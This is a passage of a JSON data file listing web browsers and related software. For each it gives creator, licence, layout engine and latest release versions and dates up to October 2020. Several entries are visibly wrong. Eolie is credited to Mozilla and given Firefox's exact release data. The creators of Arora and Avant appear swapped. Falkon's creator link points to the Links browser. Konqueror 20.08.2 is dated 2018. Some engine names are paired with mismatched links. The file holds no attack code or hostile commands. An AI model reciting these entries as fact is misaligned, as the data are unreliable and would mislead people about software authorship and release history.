                        "name": "Unknown"
                    }
                ],
                "cost": "Free",
                "status": "Unknown",
                "licence": [
                    {
                        "name": "Unknown"
                    }
                ],
                "layout": "Unknown",
                "latest-release": {
                    "version": "Unknown",
                    "date": "Unknown"
                }
            },
            "1337Browser": {
                "name": "1337 Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Unknown"
                    }
                ],
                "cost": "Free",
                "status": "Unknown",
                "licence": [
                    {
                        "name": "Unknown"
                    }
                ],
                "layout": "Unknown",
                "latest-release": {
                    "version": "Unknown",
                    "date": "Unknown"
                }
            },
            "1Password": {
                "name": "1 Password",
                "type": "Password Manager",
                "ui": "FullTextMode",
                "creator": [
                    {
                        "name": "AgileBits Inc",
                        "link": "https:\/\/1password.com\/"
                    }
                ],
                "cost": "Trialware",
                "status": "Active",
                "licence": [
                    {
                        "name": "Trialware",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Trialware"
                    }
                ],
                "layout": [
                    {
                        "name": "Trident",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Trident_(software)"
                    }
                ],
                "latest-release": {
                    "Android": {
                        "version": "7.5.1",
                        "date": "May 4, 2020"
                    },
                    "iOS": {
                        "version": "7.5.2",
                        "date": "April 22, 2020"
                    },
                    "macOS": {
                        "version": "7.5",
                        "date": "May 5, 2020"
                    },
                    "Windows": {
                        "version": "7.4.767",
                        "date": "April 27, 2020"
                    }
                }
            },
            "1stBrowser": "1st Browser",
            "2345Explorer": "2345 Explorer",
            "Mb2345Browser": "2345 Browser",
            "2345chrome": "2345 Chrome",
            "360SE": "360 Secure Browser",
            "Amaya": {
                "name": "Amaya",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "W3C",
                        "link": "https:\/\/www.w3.org\/"
                    },
                    {
                        "name": "INRIA",
                        "link": "http:\/\/www.inria.fr\/en\/"
                    }
                ],
                "cost": "Free",
                "status": "discontinued",
                "licence": [
                    {
                        "name": "W3C",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/W3C_Software_Notice_and_License"
                    }
                ],
                "layout": "custom",
                "latest-release": {
                    "version": "11.4.4",
                    "date": "January 18, 2012"
                }
            },
            "AOL": {
                "name": "AOL Explorer",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "America Online, Inc",
                        "link": "https:\/\/www.aol.com\/"
                    }
                ],
                "cost": "Free",
                "status": "discontinued",
                "licence": [
                    {
                        "name": "Proprietary",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Proprietary_software"
                    }
                ],
                "layout": [
                    {
                        "name": "Trident",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Trident_(software)"
                    }
                ],
                "latest-release": {
                    "version": "1.5",
                    "date": "May 10, 2016"
                }
            },
            "Arora": {
                "name": "Arora",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Avant Force"
                    }
                ],
                "cost": "Free",
                "status": "discontinued",
                "licence": [
                    {
                        "name": "Proprietary",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Proprietary_software"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/WebKit"
                    }
                ],
                "latest-release": {
                    "version": "0.11.0",
                    "date": "27 September 2010"
                }
            },
            "Avant": {
                "name": "Avant ",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Benjamin C. Meyer"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "GPL",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "WebKit",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(layout_engine)"
                    },
                    {
                        "name": "Gecko",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Gecko_(layout_engine)"
                    },
                    {
                        "name": "Trident",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Trident_(layout_engine)"
                    }
                ],
                "latest-release": {
                    "version": "2020 build 3",
                    "date": "March 17, 2020"
                }
            },
            "Basilisk": {
                "name": "Basilisk ",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Moonchild Productions",
                        "link": "https:\/\/www.basilisk-browser.org\/"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "MPL 2.0",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Mozilla_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "Goanna",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Goanna_(software)"
                    }
                ],
                "latest-release": {
                    "version": "2020.10.05",
                    "date": "5 October 2020"
                }
            },
            "Blisk": {
                "name": "Blisk",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Blisk team"
                    }
                ],
                "cost": {
                    "Free": "Limited",
                    "Paid": "Unlimited Pro"
                },
                "status": "Active",
                "licence": [
                    {
                        "name": "Proprietary",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Proprietary_software"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
                    },
                    {
                        "name": "V8",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/V8_(JavaScript_engine)"
                    }
                ],
                "latest-release": {
                    "version": "12.0.92.83",
                    "date": "June 29, 2019"
                }
            },
            "BeakerBrowser": {
                "name": "Beaker",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Blue Link Labs",
                        "link": "https:\/\/beakerbrowser.com\/about"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "MIT License",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/MIT_License"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
                    }
                ],
                "latest-release": {
                    "macOS": {
                        "version": "0.8.10",
                        "date": "March 13, 2020"
                    },
                    "Windows": {
                        "version": "0.8.10",
                        "date": "March 13, 2020"
                    },
                    "Linux": {
                        "version": "0.8.10",
                        "date": "March 13, 2020"
                    }
                }
            },
            "Electron": {
                "name": "Electron",
                "type": "Electron (software framework)",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "GitHub",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GitHub"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "MIT License",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/MIT_License"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
                    }
                ],
                "latest-release": {
                    "Stable release": {
                        "version": "10.1.5",
                        "date": "23 October 2020"
                    },
                    "Preview release": {
                        "version": "11.0.0-beta.16",
                        "date": "24 October 2020"
                    }
                }
            },
            "Brave": {
                "name": "Brave Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Brave Software Inc",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Brave_(browser)"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "MPL 2.0",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Mozilla_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
                    }
                ],
                "latest-release": {
                    "Android": {
                        "version": "1.15.73",
                        "date": "15 October 2020"
                    },
                    "iOS": {
                        "version": "1.20",
                        "date": "25 September 2020"
                    },
                    "macOS": {
                        "version": "1.15.75",
                        "date": "16 October 2020"
                    },
                    "Windows": {
                        "version": "1.15.75",
                        "date": "16 October 2020"
                    },
                    "Linux": {
                        "version": "1.15.75",
                        "date": "16 October 2020"
                    }
                }
            },
            "Camino": {
                "name": "Camino",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "The Camino Project"
                    }
                ],
                "cost": "Free",
                "status": "discontinued",
                "licence": [
                    {
                        "name": "MPL 1.1",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Mozilla_Public_License"
                    },
                    {
                        "name": "GPL",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
                    },
                    {
                        "name": "LGPL",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_Lesser_General_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "Gecko",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Gecko_(layout_engine)"
                    }
                ],
                "latest-release": {
                    "version": "2.1.2",
                    "date": "14 March 2012"
                }
            },
            "Cliqz": {
                "name": "Cliqz",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Cliqz GmbH"
                    }
                ],
                "cost": "Free",
                "status": "discontinued",
                "licence": [
                    {
                        "name": "MPL 2.0",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Mozilla_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "Gecko",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Gecko_(layout_engine)"
                    }
                ],
                "latest-release": {
                    "Android": {
                        "version": "1.9.7",
                        "date": "April 4, 2020"
                    },
                    "iOS": {
                        "version": "3.6.3",
                        "date": "June 30, 2020"
                    },
                    "macOS": {
                        "version": "1.38.0",
                        "date": "July 22, 2020"
                    },
                    "Windows": {
                        "version": "1.38.0",
                        "date": "July 22, 2020"
                    },
                    "Linux": {
                        "version": "1.38.0",
                        "date": "July 22, 2020"
                    }
                }
            },
            "Edg": {
                "name": "Microsoft Edge",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Microsoft Corp",
                        "link": "https:\/\/www.microsoftedgeinsider.com\/en-us\/"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "Proprietary",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Proprietary_software"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
                    }
                ],
                "latest-release": {
                    "version": "88.0.673.0",
                    "date": "14 October 2020"
                }
            },
            "Opera": {
                "name": "Opera",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Opera Software",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Opera_Software"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "Proprietary",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Proprietary_software"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
                    }
                ],
                "latest-release": {
                    "version": "71.0.3770.271",
                    "date": "14 October 2020"
                }
            },
            "Opera Mobile": {
                "name": "Opera",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Opera Software",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Opera_Software"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "Proprietary",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Proprietary_software"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
                    }
                ],
                "latest-release": {
                    "Android": {
                        "version": "59.1.2926.54067",
                        "date": "July 13, 2020"
                    },
                    "Android (classic)": {
                        "version": "12.1.9",
                        "date": "June 8, 2016"
                    },
                    "Symbian": {
                        "version": "S60 12.0.22",
                        "date": "June 24, 2012"
                    },
                    "Windows Mobile": {
                        "version": "10.0",
                        "date": "March 16, 2010"
                    }
                }
            },
            "whale": {
                "name": "Naver Whale",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Naver Corporation",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Naver_Corporation"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "Freeware",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Freeware"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
                    }
                ],
                "latest-release": {
                    "Android": {
                        "version": "1.5.4.2",
                        "date": "May 26, 2020"
                    },
                    "iOS": {
                        "version": "1.5.0",
                        "date": "May 25, 2020"
                    },
                    "macOS": {
                        "version": "2.7.100.20",
                        "date": "June 18, 2020"
                    },
                    "Windows": {
                        "version": "2.7.100.20",
                        "date": "June 18, 2020"
                    },
                    "Linux": {
                        "version": "2.7.100.20",
                        "date": "June 18, 2020"
                    }
                }
            },
            "Falkon": {
                "name": "Falkon",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "David Rosca",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Links_(web_browser)"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "GPL 3.0",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
                    }
                ],
                "latest-release": [
                    {
                        "version": "3.1.0.75",
                        "date": "March 19, 2019"
                    }
                ]
            },
            "Konqueror": {
                "name": "Konqueror Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "KDE",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/KDE"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "GPL",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "KHTML",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/KHTML"
                    },
                    {
                        "name": "WebKit",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/WebKit"
                    }
                ],
                "latest-release": {
                    "Stable release": {
                        "version": "20.08.2",
                        "date": "7 June 2018"
                    },
                    "Preview release": []
                }
            },
            "YaBrowser": {
                "name": "Yandex Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Yandex",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Yandex"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "Proprietary",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Proprietary_software"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
                    }
                ],
                "latest-release": {
                    "Android": {
                        "version": "20.6.3.54",
                        "date": "July 23, 2020"
                    },
                    "iOS": {
                        "version": "20.6.2.318",
                        "date": "July 16, 2020"
                    },
                    "macOS": {
                        "version": "20.7.2",
                        "date": "July 2020"
                    },
                    "Windows": {
                        "version": "20.7.2",
                        "date": "July 2020"
                    },
                    "Linux": {
                        "version": "20.7.2",
                        "date": "July 2020"
                    }
                }
            },
            "QtWebEngine": {
                "name": "Qt Web Engine based browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Dooble Project Team",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Dooble"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "BSD",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/BSD_licenses"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
                    }
                ],
                "latest-release": [
                    {
                        "version": "2020.10.10",
                        "date": "October 10, 2020"
                    }
                ]
            },
            "Iron": {
                "name": "SRWare Iron",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "SRWare",
                        "link": "www.srware.net\/en\/software_srware_iron.php"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "BSD",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/BSD_licenses"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
                    },
                    {
                        "name": "V8",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/V8_(JavaScript_engine)"
                    }
                ],
                "latest-release": {
                    "Android": {
                        "version": "74.0.3850.0",
                        "date": "May 10, 2019"
                    },
                    "macOS": {
                        "version": "84.0.4300.0",
                        "date": "August 29, 2020"
                    },
                    "Windows": {
                        "version": "85.0.4350.0",
                        "date": "October 2, 2020"
                    },
                    "Linux": {
                        "version": "85.0.4350.0",
                        "date": "October 6, 2020"
                    }
                }
            },
            "Chrome": {
                "name": "Google Chrome",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Google LLC",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Google"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "BSD (Chromium executable) (some closed-source features)",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/BSD_licenses"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
                    }
                ],
                "latest-release": {
                    "Android": {
                        "version": "86.0.4240.114",
                        "date": "October 22, 2020"
                    },
                    "iOS": {
                        "version": "86.0.4240.93",
                        "date": "October 12, 2020"
                    },
                    "macOS": {
                        "version": "86.0.4240.111",
                        "date": "October 20, 2020"
                    },
                    "Windows": {
                        "version": "86.0.4240.111",
                        "date": "October 20, 2020"
                    },
                    "Linux": {
                        "version": "86.0.4240.111",
                        "date": "October 20, 2020"
                    }
                }
            },
            "Chromium": {
                "name": "Chromium Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "The Chromium Project",
                        "link": "https:\/\/www.chromium.org\/"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "BSD",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/BSD_licenses"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
                    }
                ],
                "latest-release": [
                    {
                        "name": "built nightly",
                        "link": "https:\/\/chromium.woolyss.com\/"
                    }
                ]
            },
            "Comodo_Dragon": {
                "name": "Comodo Dragon",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Comodo Group",
                        "link": "https:\/\/www.comodo.com\/home\/browsers-toolbars\/internet-products.php"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "BSD",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/BSD_licenses"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
                    }
                ],
                "latest-release": [
                    {
                        "version": "83.0.4103.116",
                        "date": "July 21, 2020"
                    }
                ]
            },
            "IceDragon": {
                "name": "Comodo Ice Dragon",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Comodo Group",
                        "link": "https:\/\/www.comodo.com\/home\/browsers-toolbars\/internet-products.php"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "MPL 2.0",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Mozilla_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "Gecko",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Gecko_(layout_engine)"
                    }
                ],
                "latest-release": [
                    {
                        "version": "65.0.2.15",
                        "date": "June 19, 2019"
                    }
                ]
            },
            "Dillo": {
                "name": "Dillo",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "The Dillo team",
                        "link": "https:\/\/www.dillo.org\/"
                    }
                ],
                "cost": "Free",
                "status": "discontinued",
                "licence": [
                    {
                        "name": "GPL",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "custom"
                    }
                ],
                "latest-release": [
                    {
                        "version": "3.0.5",
                        "date": "30 June 2015"
                    }
                ]
            },
            "Dooble": {
                "name": "Dooble",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Dooble Project Team",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Dooble"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "BSD",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/BSD_licenses"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
                    }
                ],
                "latest-release": [
                    {
                        "version": "2020.10.10",
                        "date": "October 10, 2020"
                    }
                ]
            },
            "ELinks": {
                "name": "ELinks",
                "type": "Web Browser",
                "ui": "TextBasedMode",
                "creator": [
                    {
                        "name": "Baudis, Fonseca, et al.",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/ELinks"
                    }
                ],
                "cost": "Free",
                "status": "discontinued",
                "licence": [
                    {
                        "name": "GPL",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "custom",
                        "note": "fork of Links"
                    }
                ],
                "latest-release": [
                    {
                        "version": "0.11.7",
                        "date": "22 August 2009"
                    }
                ]
            },
            "Epiphany": {
                "name": "GNOME Web",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Marco Pesenti Gritti",
                        "link": "https:\/\/www.gnome.org\/news\/2015\/05\/goodbye-marco\/"
                    },
                    {
                        "name": "The GNOME Project",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/The_GNOME_Project"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "GPL",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "WebKitGTK",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/WebKitGTK"
                    }
                ],
                "latest-release": {
                    "Stable release": {
                        "version": "3.38.1",
                        "date": "8 October 2020"
                    },
                    "Preview release": {
                        "version": "3.37.92",
                        "date": "13 September 2020"
                    }
                }
            },
            "Links": {
                "name": "Links",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Patocka, et al",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Links_(web_browser)"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "GPL",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "custom"
                    }
                ],
                "latest-release": [
                    {
                        "version": "2.21",
                        "date": "2 August 2020"
                    }
                ]
            },
            "Flock": {
                "name": "Flock",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Flock Inc",
                        "link": [
                            "https:\/\/web.archive.org\/web\/20110325151017\/http:\/\/www.flock.com\/",
                            "https:\/\/en.wikipedia.org\/wiki\/Flock_(web_browser)"
                        ]
                    }
                ],
                "cost": "Free",
                "status": "discontinued",
                "licence": [
                    {
                        "name": "Proprietary",
                        "note": "(as of 3.0)",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Proprietary_software"
                    }
                ],
                "layout": [
                    {
                        "name": "WebKit",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/WebKit"
                    }
                ],
                "latest-release": [
                    {
                        "version": "3.5.3.4641",
                        "date": "February 1, 2011"
                    }
                ]
            },
            "Waterfox": {
                "name": "Waterfox Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Alex Kontos"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "GPL",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "Gecko",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Gecko_(layout_engine)"
                    }
                ],
                "latest-release": [
                    {
                        "version": "2020.10",
                        "date": "21 October 2020"
                    }
                ]
            },
            "Eolie": {
                "name": "Eolie Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Mozilla Foundation",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Mozilla_Foundation"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "MPL 2.0",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Mozilla_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "Gecko",
                        "note": "(before v57)",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Gecko_(layout_engine)"
                    },
                    {
                        "name": "Gecko w\/Servo",
                        "note": "v57 & after",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Servo_(software)"
                    }
                ],
                "latest-release": {
                    "Standard": {
                        "version": "82.0",
                        "date": "October 20, 2020"
                    },
                    "Extended Support Release": {
                        "version": "78.4.0",
                        "date": "October 20, 2020"
                    }
                }
            },
            "PaleMoon": {
                "name": "PaleMoon Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Moonchild Productions"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "MPL 2.0",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Mozilla_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "Goanna",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Goanna_(software)"
                    }
                ],
                "latest-release": {
                    "Standard": {
                        "version": "28.15.0",
                        "date": "27 October 2020"
                    }
                }
            },
            "SeaMonkey": {
                "name": "SeaMonkey Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "SeaMonkey Council"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "MPL 2.0",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Mozilla_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "Gecko",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Gecko_(layout_engine)"
                    }
                ],
                "latest-release": {
                    "Stable release": {
                        "version": "2.53.4",
                        "date": "September 22, 2020"
                    },
                    "Preview release": {
                        "version": "2.53.5b1",
                        "date": "October 29, 2020"
                    }
                }
            },
            "SalamWeb": {
                "name": "SalamWeb Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "SalamWeb",
                        "link": "https:\/\/salamweb.com\/"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "Freeware",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Freeware"
                    }
                ],
                "layout": [
                    {
                        "name": "Blink",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Blink_(web_engine)"
                    }
                ],
                "latest-release": {
                    "Windows": {
                        "version": "4.5",
                        "date": "July 31, 2020"
                    },
                    "Android": {
                        "version": "4.5.0.40",
                        "date": "June 25, 2020"
                    },
                    "macOS": {
                        "version": "4.5",
                        "date": "June 20, 2020"
                    },
                    "iOS": {
                        "version": "4.5",
                        "date": "June 20, 2020"
                    }
                }
            },
            "firefox": {
                "name": "Firefox Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Mozilla Foundation",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Mozilla_Foundation"
                    }
                ],
                "cost": "Free",
                "status": "Active",
                "licence": [
                    {
                        "name": "MPL 2.0",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Mozilla_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "Gecko",
                        "note": "(before v57)",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Gecko_(layout_engine)"
                    },
                    {
                        "name": "Gecko w\/Servo",
                        "note": "v57 & after",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Servo_(software)"
                    }
                ],
                "latest-release": {
                    "Standard": {
                        "version": "82.0",
                        "date": "October 20, 2020"
                    },
                    "Extended Support Release": {
                        "version": "78.4.0",
                        "date": "October 20, 2020"
                    }
                }
            },
            "Galeon": {
                "name": "Galeon Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Marco Pesenti Gritti",
                        "link": "https:\/\/www.gnome.org\/news\/2015\/05\/goodbye-marco\/"
                    }
                ],
                "cost": "Free",
                "status": "discontinued",
                "licence": [
                    {
                        "name": "GPL",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/GNU_General_Public_License"
                    }
                ],
                "layout": [
                    {
                        "name": "Gecko",
                        "link": "https:\/\/en.wikipedia.org\/wiki\/Gecko_(layout_engine)"
                    }
                ],
                "latest-release": [
                    {
                        "version": "2.0.7",
                        "date": "27 September 2008"
                    }
                ]
            },
            "iCab": {
                "name": "iCab Browser",
                "type": "Web Browser",
                "ui": "GraphicalMode",
                "creator": [
                    {
                        "name": "Alexander Clauss",
                        "link": "https:\/\/www.clauss-net.de\/"
                    }
